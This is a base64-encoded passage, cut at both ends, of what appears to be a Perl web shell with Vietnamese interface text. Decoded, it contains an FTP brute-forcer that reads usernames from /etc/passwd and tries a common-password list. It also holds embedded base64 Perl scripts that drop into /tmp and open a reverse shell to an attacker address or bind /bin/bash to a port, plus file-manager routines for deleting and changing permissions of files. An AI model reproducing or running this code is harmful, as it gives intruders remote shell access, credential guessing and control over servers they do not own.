yMjIyMKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4KPC90ZD4KPC90cj4KPHRyPgo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+CkVORApjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOwokcmVzdWx0IC49IDw8J0VORCc7CjwvdGV4dGFyZWE+PC90ZD4KPHRkPgoKUGFzczo8YnI+Cjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MKMTIzIUAjCjEyM2FkbWluCjEyM2FiYwoxMjM0NTZhZG1pbgoxMjM0NTU0MzIxCjEyMzQ0MzIxCnBhc3MxMjMKYWRtaW4KYWRtaW5jcAphZG1pbmlzdHJhdG9yCm1hdGtoYXUKcGFzc2FkbWluCnBAc3N3b3JkCnBAc3N3MHJkCnBhc3N3b3JkCjEyMzQ1NgoxMjM0NTY3CjEyMzQ1Njc4CjEyMzQ1Njc4OQoxMjM0NTY3ODkwCjExMTExMQowMDAwMDAKMjIyMjIyCjMzMzMzMwo0NDQ0NDQKNTU1NTU1CjY2NjY2Ngo3Nzc3NzcKODg4ODg4Cjk5OTk5OQoxMjMxMjMKMjM0MjM0CjM0NTM0NQo0NTY0NTYKNTY3NTY3CjY3ODY3OAo3ODk3ODkKMTIzMzIxCjQ1NjY1NAo2NTQzMjEKNzY1NDMyMQo4NzY1NDMyMQo5ODc2NTQzMjEKMDk4NzY1NDMyMQphZG1pbjEyMwphZG1pbjEyMzQ1NgphYmNkZWYKYWJjYWJjCiFAIyFAIwohQCMkJV4KIUAjJCVeJiooCiFAIyQkI0AhCmFiYzEyMwphbmh5ZXVlbQppbG92ZXlvdTwvdGV4dGFyZWE+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4KCjxvcHRpb24+MDwvb3B0aW9uPgo8b3B0aW9uPjE8L29wdGlvbj4KPG9wdGlvbj4yPC9vcHRpb24+Cgo8b3B0aW9uPjM8L29wdGlvbj4KPC9zZWxlY3Q+IAo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPgo8L2Zvcm0+CjwvdGFibGU+CkVORApyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQnJ1dGUgRm9yY2VyCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyCnsKCW15ICRyZXN1bHQ9IiI7CgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307CglpZigkaW57J3VzZXInfSBlcSAiIikKCXsKCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07Cgl9ZWxzZQoJewoJCXVzZSBOZXQ6OkZUUDsgCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsKCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOwoJCWNob21wKEB1c2VyKTsKCQljaG9tcChAcGFzcyk7CgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj09PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7CgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQoJCXsKCQkJaWYoISgkdXNlcm5hbWUgZXEgIiIpKQoJCQl7CgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpCgkJCQl7CgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQoJCQkJCXsKCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7CgkJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpCgkJCQkJewoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7CgkJCQkJfQoJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCX0KCQkJfQoJCX0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZEZvcm0KewoJcmV0dXJuIDw8RU5EOwoJPGJyPjxicj4KCgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPgoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNyIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+CgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+Cgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPgoKCTxicj48YnI+Cgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+CgoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0iVEhJRVVHSUFCVU9OIj48L3RkPgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQoJPGJyPlsrXSBUcnkgY29tbWFuZDogPHJ1bj5uYyAkRU5WeydTRVJWRVJfQUREUid9IDxzcGFuIGlkPSJiaSI+MTQxMjwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4KCgk8L3RyPgoJPC90YWJsZT48YnI+CkVORAp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCYWNrY29ubmVjdCB1c2UgcGVybAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZAp7Cgl1c2UgTUlNRTo6QmFzZTY0OwoJdXNlIFNvY2tldDsJCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7CgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOwoKCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307CgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7CglpZigkQ2xpZW50UG9ydCBlcSAwKQoJewoJCXJldHVybiAmQmFja0JpbmRGb3JtOwoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikKCXsKCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7CgkJaWYoLXcgIi90bXAvIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX1lbHNlCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOwoJCWlmKC13ICIvdG1wIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJtRGlyKCQpIAp7CglteSAkZGlyID0gc2hpZnQ7CiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkKCXsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkKCQl7CgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkKCQkJewoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7CgkJCQlpZigtZCAkZmlsZSkKCQkJCXsKCQkJCQkmUm1EaXIoJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXVubGluaygkZmlsZSk7CgkJCQl9CgkJCX0KCQl9CgkJY2xvc2VkaXIoRElSKTsKCX0KCWlmKCFybWRpcigkZGlyKSkKCXsKCQkKCX0KfQpzdWIgRmlsZU93bmVyKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJHVpZCwkZ2lkKSA9IChzdGF0KCRmaWxlKSlbNCw1XTsKCQlpZigkV2luTlQpCgkJewoJCQlyZXR1cm4gIj8/PyI7CgkJfQoJCWVsc2UKCQl7CgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOwoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7CgkJCXJldHVybiAkbmFtZS4iLyIuJGdyb3VwOwoJCX0KCX0KCXJldHVybiAiPz8/IjsKfQpzdWIgUGFyZW50Rm9sZGVyKCQpCnsKCW15ICRwYXRoID0gc2hpZnQ7CglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7CgljaG9wKCRwYXRoID0gYCRDb21tYCk7CglyZXR1cm4gJHBhdGg7Cn0Kc3ViIEZpbGVQZXJtcygkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJbXkgJHVyID0gIi0iOwoJbXkgJHV3ID0gIi0iOwoJaWYoLWUgJGZpbGUpCgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJaWYoLXIgJGZpbGUpeyAkdXIgPSAiciI7IH0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3OwoJCX1lbHNlCgkJewoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOwoJCQkkcmVzdWx0ID0gc3ByaW50ZigiJTA0byIsICRtb2RlICYgMDc3NzcpOwoJCQlyZXR1cm4gJHJlc3VsdDsKCQl9Cgl9CglyZXR1cm4gIjAwMDAiOwp9CnN1YiBGaWxlTGFzdE1vZGlmaWVkKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07CgkJKCRkLCRtLCR5LCRoLCRpKSA9IChsb2NhbHRpbWUoJGxhKSlbMyw0LDUsMiwxXTsKCQkkeSA9ICR5ICsgMTkwMDsKCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87CgkJJGxtdGltZSA9IHNwcmludGYoIiUwMmQvJXMvJTRkICUwMmQ6JTAyZCIsJGQsJG1vbnRoWyRtXSwkeSwkaCwkaSk7CgkJcmV0dXJuICRsbXRpbWU7Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIEZpbGVTaXplKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZiAkZmlsZSkKCXsKCQlyZXR1cm4gLXMgJGZpbGU7Cgl9CglyZXR1cm4gIjAiOwoKfQpzdWIgUGFyc2VGaWxlU2l6ZSgkKQp7CglteSAkc2l6ZSA9IHNoaWZ0OwoJaWYoJHNpemUgPD0gMTAyNCkKCXsKCQlyZXR1cm4gJHNpemUuICIgQiI7Cgl9CgllbHNlCgl7CgkJaWYoJHNpemUgPD0gMTAyNCoxMDI0KSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIEtCIjsKCQl9CgkJZWxzZSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIE1CIjsKCQl9Cgl9Cn0Kc3ViIHRyaW0oJCkKewoJbXkgJHN0cmluZyA9IHNoaWZ0OwoJJHN0cmluZyA9fiBzL15ccysvLzsKCSRzdHJpbmcgPX4gcy9ccyskLy87CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgQWRkU2xhc2hlcygkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgTGlzdERpcgp7CglteSAkcGF0aCA9ICRDdXJyZW50RGlyLiRQYXRoU2VwOwoJJHBhdGg9fiBzL1xcXFwvXFwvZzsKCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOwoJaWYoLWQgJHBhdGgpCgl7CgkJbXkgQGZuYW1lID0gKCk7CgkJbXkgQGRuYW1lID0gKCk7CgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQoJCXsKCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJCXsKCQkJCSRmPSRwYXRoLiRmaWxlOwoJCQkJaWYoLWQgJGYpCgkJCQl7CgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcihESVIpOwoJCX0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7CgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOwoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4KCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPgoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCSRkID0gJHBhdGg7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+CgoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+PGEgIGhyZWY9Jz9hPWd1aSZkPSIuJGQuIic+WyAiLiRkaXJuYW1lLiIgXTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRkKS4iJywnIi4kZGlybmFtZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oIi4kaS4iLCciLiRkaXJuYW1lLiInKVwiID4iLiZGaWxlUGVybXMoJGQpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8L3RyPiI7CgkJCSRpKys7CgkJfQoJCWZvcmVhY2ggbXkgJGYgKEBmbmFtZSkKCQl7CgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlPSRmOwoJCQkkZiA9ICRwYXRoLiRmOwoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7CgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+Ii4kZmlsZS4iPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFs